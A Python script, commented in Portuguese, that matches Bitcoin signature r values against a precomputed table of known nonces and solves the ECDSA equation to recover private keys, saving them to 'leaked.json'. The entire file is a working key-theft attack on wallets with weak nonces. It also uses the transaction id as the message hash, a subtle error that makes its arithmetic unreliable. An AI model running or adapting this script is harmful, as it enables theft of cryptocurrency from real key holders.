from bitcoinlib.wallets import wallet_create_or_open
from bitcoinlib.keys import Signature 
from fastecdsa.curve import secp256k1
import json
from tqdm import tqdm

# Parâmetros da curva elíptica
G = secp256k1.G
n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

def load_precalc():
    with open('precalc.json') as f:
        mapa = json.load(f)
        rev_map = {int(v): k for k,v in mapa.items()}
        return rev_map
            

def load_transcations():
    with open('transcations.json') as f:
        return json.load(f)

    
print('Carregando transações...')
trans = load_transcations()
print('Carregado!')

print('Carregando precalc...')
mapa = load_precalc()
print('Carregado!')

found_keys = {}

print('Procurando transações com r conhecido...')
for pub_key, sigs in tqdm(trans.items()):
    for txid, r, s in sigs:
        r = int(r, 16)

        if r in mapa:
            print('Achou!')
            k = int(mapa[r])

            z = int(txid, 16)
            s = int(s, 16)

            d1 = ((((s*k) % n) - z) * pow(r, -1, n)) % n
            s = -s
            d2 = ((((s*k) % n) - z) * pow(r, -1, n)) % n
            print(f'{pub_key = }, {d1 = }, {d2 = }')

            found_keys[pub_key] = [d1, d2]

            break


print(f'Quantidade total de chaves privadas recuperadas: {len(found_keys)}')
with open('leaked.json', 'w') as f:
    json.dump(found_keys, f)
        

